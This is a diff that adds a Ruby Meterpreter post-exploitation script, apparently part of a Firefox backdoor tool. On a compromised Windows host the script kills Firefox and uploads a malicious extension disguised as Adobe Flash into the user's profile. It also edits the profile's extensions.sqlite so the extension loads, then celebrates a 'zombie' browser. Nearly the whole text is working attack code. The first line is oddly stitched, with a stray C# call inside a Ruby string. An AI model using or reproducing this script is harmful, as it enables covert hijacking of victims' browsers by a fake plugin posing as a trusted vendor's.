@@ -1,0 +1,101 @@
+print_status "Script starting, this.SleepEx(5000); // simulate work"
+sleep 5
+if client.sys.config.sysinfo["OS"] =~ /Windows/
+  appdata = client.fs.file.expand_path("%APPDATA%")
+  firefox_dir = appdata + "\\Mozilla\\Firefox\\Profiles"
+  print_good "Profile dir exists"
+  paths = ''
+  bbdoor_path = "/root/bbdoor"					# change this to directory where the corresponding files are located
+  plist = client.sys.process.get_processes()
+	plist.each do |x|
+		if ("firefox.exe" == x['name'])
+			client.sys.process.kill(x['pid'])
+			print_good "Firefox process killed."
+		end
+	end
+  begin
+    client.fs.dir.foreach(firefox_dir) do |pdirs|
+      next if pdirs == "." or pdirs == ".."
+      paths << firefox_dir + pdirs
+      if (paths =~ /bbdoor/)						# change this to the profile name, e.g. default
+        #print_good("Found Profile #{pdirs}")
+        profile_path =  firefox_dir + "\\" + pdirs
+        print_good  "Found Profile: " + profile_path
+        begin
+          err = client.fs.file.upload(profile_path + "\\extensions",bbdoor_path + "/flashX@adobe.com.xpi")
+          print_status "Uploading extension"
+        rescue
+          print_error("Upload error")
+          return
+        end
+	begin
+		err = client.fs.file.download(bbdoor_path, profile_path + "\\extensions.sqlite")
+	rescue
+		print_error("Download error")
+		return
+	end
+        result = system '/root/bbdoor/sqlite.sh'	
+	if(!result)
+          print_error("Error executing sqlite locally.")
+          return
+	end
+	sleep 1
+	begin
+		err = client.fs.file.upload(profile_path, bbdoor_path + "//extensions.sqlite")
+	rescue
+		print_error("Error uploading modified sqlite file.")
+	end
+	
+	begin
+		if (client.fs.file.exists?(profile_path +"\\extensions\\debug.txt"))
+		file1 = client.fs.file.new(profile_path +"\\extensions\\debug.txt", 'r')
+		until file1.eof?
+			print_error file1.read
+		end
+		return
+		file1.close
+		end
+	rescue
+		print_good("Empty debug.txt.")
+		file1.close
+	end
+       
+	  begin
+          print_good "Temp files removed"
+          print_good "Installation successfull, have a nice zombie day."
+
+          print_good "                               ......		  "          
+          print_good "                               C C  /            "
+          print_good "                              /<   /             "
+          print_good "               ___ __________/_#__=o             "
+          print_good "              /(- /(\\_\\________   \\              "
+          print_good "              \\ ) \\ )_      \\o     \\             "
+          print_good "              /|\\ /|\\       |'     |             "
+          print_good "                            |     _|             "
+          print_good "                            /o   __\\             "
+          print_good "                           / '     |             "
+          print_good "                          / /      |             "
+          print_good "                         /_/\\______|             "
+          print_good "                        (   _(    <              "
+          print_good "                         \\    \\    \\             "
+          print_good "                          \\    \\    |            "
+          print_good "                           \\____\\____\\           "
+          print_good "                           ____\\_\\__\\_\\          "
+          print_good "                         /`   /`     o\\          "
+          print_good "                         |___ |_______|"
+		  return
+
+      rescue
+          print_error("Error removing temp files.")
+          return
+      end
+
+      end
+    end
+  rescue
+    print_error("Profiles directory missing")
+    return
+  end
+  
+end
+
